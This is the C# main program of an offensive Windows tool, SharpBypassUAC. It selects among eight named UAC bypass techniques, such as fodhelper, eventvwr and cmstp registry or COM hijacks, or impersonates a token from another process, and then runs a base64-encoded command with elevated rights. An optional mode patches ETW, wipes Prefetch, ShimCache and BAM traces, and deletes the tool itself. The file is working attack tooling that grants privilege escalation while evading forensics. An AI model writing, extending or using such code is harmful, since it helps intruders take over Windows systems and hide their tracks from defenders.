using System;
using System.Text;

namespace SharpBypassUAC
{
    class Program
    {
        static void PrintHelp()
        {
            Console.WriteLine("SharpBypassUAC - UAC Bypass & Token Impersonation");
            Console.WriteLine();
            Console.WriteLine("UAC Bypass:");
            Console.WriteLine("  SharpBypassUAC.exe -b <method> -e <base64command> [-c]");
            Console.WriteLine();
            Console.WriteLine("  Methods:");
            Console.WriteLine("    fodhelper        ms-settings registry hijack via fodhelper.exe");
            Console.WriteLine("    eventvwr         mscfile registry hijack via eventvwr.exe");
            Console.WriteLine("    computerdefaults ms-settings registry hijack via ComputerDefaults.exe");
            Console.WriteLine("    sdclt            Folder registry hijack via sdclt.exe (Win10 only)");
            Console.WriteLine("    slui             exefile registry hijack via slui.exe");
            Console.WriteLine("    diskcleanup      Environment variable hijack via SilentCleanup task");
            Console.WriteLine("    shadercache      Intel ShaderCache junction + DLL hijack (x64, requires Intel GPU)");
            Console.WriteLine("    cmstp            CMSTPLUA COM elevation (no registry modification)");
            Console.WriteLine();
            Console.WriteLine("Token Impersonation:");
            Console.WriteLine("  SharpBypassUAC.exe -t <pid> -e <base64command> [-c]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  -b <method>   UAC bypass method to use");
            Console.WriteLine("  -t <pid>      Impersonate token from target process (requires local admin)");
            Console.WriteLine("  -e <base64>   Base64-encoded command to execute");
            Console.WriteLine("  -c            Anti-forensic cleanup (ETW patch, Prefetch/ShimCache/BAM wipe, self-delete)");
            Console.WriteLine("  -h            Show this help");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  SharpBypassUAC.exe -b fodhelper -e <base64(cmd.exe /c whoami > C:\\out.txt)>");
            Console.WriteLine("  SharpBypassUAC.exe -b fodhelper -e <base64(cmd.exe)> -c");
            Console.WriteLine("  SharpBypassUAC.exe -b cmstp -e <base64(powershell.exe -enc ...)> -c");
            Console.WriteLine("  SharpBypassUAC.exe -t 624 -e <base64(cmd.exe /c whoami)> -c");
        }

        static void Main(string[] args)
        {
            string bypass = null;
            string encodedStr = null;
            int targetPid = -1;
            bool help = false;
            bool cleanup = false;

            for (int i = 0; i < args.Length; i++)
            {
                string arg = args[i];
                if (arg == "-h" || arg == "--help" || arg == "/h" || arg == "/?")
                {
                    help = true;
                }
                else if ((arg == "-b" || arg == "--bypass") && i + 1 < args.Length)
                {
                    bypass = args[++i].ToLower();
                }
                else if ((arg == "-e" || arg == "--encoded") && i + 1 < args.Length)
                {
                    encodedStr = args[++i];
                }
                else if ((arg == "-t" || arg == "--token") && i + 1 < args.Length)
                {
                    if (!int.TryParse(args[++i], out targetPid))
                    {
                        Console.WriteLine("[!] Invalid PID");
                        return;
                    }
                }
                else if (arg == "-c" || arg == "--clean")
                {
                    cleanup = true;
                }
            }

            if (help || (bypass == null && targetPid == -1))
            {
                PrintHelp();
                return;
            }

            if (encodedStr == null)
            {
                Console.WriteLine("[!] Missing -e <base64command>");
                return;
            }

            byte[] encodedCommand;
            try
            {
                encodedCommand = Convert.FromBase64String(encodedStr);
            }
            catch
            {
                Console.WriteLine("[!] Invalid base64 string");
                return;
            }

            // If cleanup requested, patch ETW first to suppress .NET CLR events
            // from this process BEFORE performing the bypass
            string selfPath = null;
            if (cleanup)
            {
                try
                {
                    selfPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                }
                catch { }
                AntiForensic.RunLight(selfPath);
            }

            try
            {
                if (targetPid > 0)
                {
                    string command = Encoding.UTF8.GetString(encodedCommand);
                    TokenImpersonation.Run(targetPid, command);
                }
                else
                {
                    switch (bypass)
                    {
                        case "fodhelper":
                            new FodHelper(encodedCommand);
                            break;
                        case "eventvwr":
                            new EventVwr(encodedCommand);
                            break;
                        case "computerdefaults":
                            new ComputerDefaults(encodedCommand);
                            break;
                        case "sdclt":
                            new Sdclt(encodedCommand);
                            break;
                        case "slui":
                            new Slui(encodedCommand);
                            break;
                        case "diskcleanup":
                            new DiskCleanup(encodedCommand);
                            break;
                        case "shadercache":
                            new IntelShaderCache(encodedCommand);
                            break;
                        case "cmstp":
                            new CmsTPLua(encodedCommand);
                            break;
                        default:
                            Console.WriteLine("[!] Unknown method: " + bypass);
                            PrintHelp();
                            break;
                    }
                }

                // Post-bypass cleanup: full anti-forensic sweep
                // The bypass elevated our payload, but this process may still
                // be medium integrity. The elevated child should run its own
                // full cleanup. Here we do what we can at current integrity.
                if (cleanup && selfPath != null)
                {
                    // Check if we have high integrity (token impersonation gives it)
                    bool isElevated = false;
                    try
                    {
                        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                        var principal = new System.Security.Principal.WindowsPrincipal(identity);
                        isElevated = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                    }
                    catch { }

                    if (isElevated)
                        AntiForensic.Run(selfPath, true);
                    else
                        Console.WriteLine("[*] Medium integrity: full cleanup requires elevated context");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] " + ex.Message);
            }
        }
    }
}
